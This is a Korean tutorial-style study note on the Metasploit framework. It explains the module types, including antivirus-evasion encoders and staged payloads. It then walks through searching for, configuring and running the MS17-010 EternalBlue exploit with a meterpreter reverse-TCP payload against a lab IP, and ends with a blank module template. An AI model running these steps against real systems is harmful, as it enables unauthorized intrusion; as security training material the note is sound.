# Metasploit🧰

정보수집, 익스플로잇, Post-익스플로잇까지 모든 공격단계에서 활용할 수 있는 공격 Framework 

<br>

### Auxiliary

익스를 하는데 도움을 주는 스캐닝, 크롤러, 퍼저같은 지원 모듈 카테고리 

<br>

### Encoder

**시그니처 기반의 안티 바이러스 솔루션을 우회**하기 위해 페이로드를 인코딩할 수 있는 모듈 카테고리 

<br>

### evasion Module

특정 안티 바이너스 솔루션을 우회하기 위한 카테고리

인코더는 페이로드 패턴 변경 / 이건 특정 보안 솔루션을 우회 

<br>

### Exploit

특정 취약점을 Exploit하는 모듈 

<br>

### NOP

CPU별 NOP Code 모듈 ⇒ 더미데이터 

<br>

### Payload

타겟 시스템에서 실행되는 코드들 

- **Single Payload** : 단독으로 실행 가능.
- **Staged Payload** : stager코드와 stage코드로 구성.
    - `Stager` : Metasploit과 타겟시스템 사이 연결 담당. 침투
    - `Stage` : Stager에 의해 다운로드 됨. 실제로 실행되는 페이로드

<br>

### Post

쉘 획득 후 진행되는 Post-Exploit 단계에서 사용되는 공격 모듈

<br>


# Metasploit 사용🖥️

```bash
#메타스플로잇을 CLI로 실행 

$ msfconsole 
```

<br>

## 명령어

`search [Keyword]` : 모듈 검색 

```bash
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                                                       
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                    
```

<br>

`use [Module Path]` : 모듈 사용 

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

<br>

(모듈 use 후) `info` : 자세한 설명 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
  ...
```

<br>

(모듈 use 후) `options` : 이 모듈에서 설정할 수 있는 옵션들

 **Required  값이 yes인 옵션은 필수임** 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  **Required**  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/u
                                             sing-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. O
                                             nly affects Windows Server 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only
                                             affects Windows Server 2008 R2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard
                                              7 target machines.
```

<br>

(모듈 use 후)  `set [Option] [Value]`

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.25.184
rhost => 10.10.25.184

msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.25.184     yes       The target host(s), see https://docs.metasploit.com/docs/u
                                             sing-metasploit/basics/using-metasploit.html
   ...
```

<br>

`run` or `exploit` : 실행. 두 명령어 차이는 없음 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on ...:4444 
[*] ...:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] ...:445   - Host does NOT appear vulnerable.
[*] ...:445   - Scanned 1 of 1 hosts (100% complete)
[-] ...:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

<br>

# Metasploit Module 제작🪛

🔗[Metasploit Module Template](https://docs.metasploit.com/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#template)

필수 내용은 아래와 같음 

```python
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Module name',
        'Description' => %q{
          Say something that the user might need to know
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Name' ],
      )
    )
  end

  def run
    # Main function (루비 언어 사용)
  end

end
```

